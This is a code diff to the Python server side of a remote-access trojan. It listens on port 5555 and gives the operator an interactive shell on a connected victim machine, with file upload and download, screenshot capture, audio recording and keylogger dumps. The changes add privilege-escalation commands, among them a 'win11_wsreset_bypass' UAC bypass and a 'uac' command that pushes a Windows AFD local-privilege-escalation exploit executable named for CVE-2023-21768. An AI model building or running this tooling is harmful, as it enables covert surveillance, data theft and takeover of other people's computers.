@@ -7,38 +7,38 @@ import os
 
 def reliable_send(data):
     jsondata = json.dumps(data)
-    target.send(jsondata.encode())
+    client[0].send(jsondata.encode())
 
 def reliable_recv():
     data = ''
     while True:
         try:
-            data += target.recv(1024).decode().rstrip()
+            data += client[0].recv(1024).decode().rstrip()
             return json.loads(data)
         except ValueError:
             continue
 
 def upload_file(file_name):
     with open(file_name, 'rb') as f:
-        target.send(f.read())
+        client[0].send(f.read())
 
 def download_file(file_name):
     with open(file_name, 'wb') as f:
-        target.settimeout(1)
+        client[0].settimeout(10)
         try:
             while True:
-                chunk = target.recv(1024)
+                chunk = client[0].recv(1024)
                 if not chunk:
                     break
                 f.write(chunk)
         except socket.timeout:
             pass
-        target.settimeout(None)
+        client[0].settimeout(None)
 
 def target_communication():
     while True:
-        command = input('* Shell~%s: ' % str(ip))
-        reliable_send(command)
+        command = input('>>>  ')
+        client[0].send(command.encode())
         if command == 'quit':
             break
         elif command == 'clear':
@@ -50,23 +50,42 @@ def target_communication():
         elif command[:6] == 'upload':
             upload_file(command[7:])
         elif command == 'screenshot':
+            print(client[0].recv(1024).decode())
             download_file('screen.png')
             print("[+] Screenshot saved as screen.png")
         elif command == 'record_audio':
-            print(reliable_recv())  # Acknowledge
+            print(client[0].recv(1024).decode())  # Acknowledge
             download_file('recording.wav')
             print("[+] Audio saved as recording.wav")
         elif command == 'keylog_dump':
             result = reliable_recv()
             print("\n[+] Keylogger Output:\n" + result + "\n")
-        else:
+            
+        # Privilege escalation commands
+        elif command == 'check_admin':
             result = reliable_recv()
             print(result)
+        elif command == 'win11_wsreset_bypass':
+            result = reliable_recv()
+            print(result)
+        
+        elif command == 'pid':
+            result = reliable_recv()
+            print(result)
+        elif command == 'uac':
+            upload_file('Windows_AFD_LPE_CVE-2023-21768_x64.exe')
+            print("[+] uploaded")
+            result = reliable_recv()
+            print(result)
+        else:
+            result = client[0].recv(1024).decode()
+            print(result)
+        
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('192.168.56.103', 5555))  # Change to your listener IP
 print('[+] Listening For Incoming Connections')
 sock.listen(5)
-target, ip = sock.accept()
-print('[+] Target Connected From: ' + str(ip))
+client = sock.accept()
+print(f'[+] client connected {client[1]}')
 target_communication()
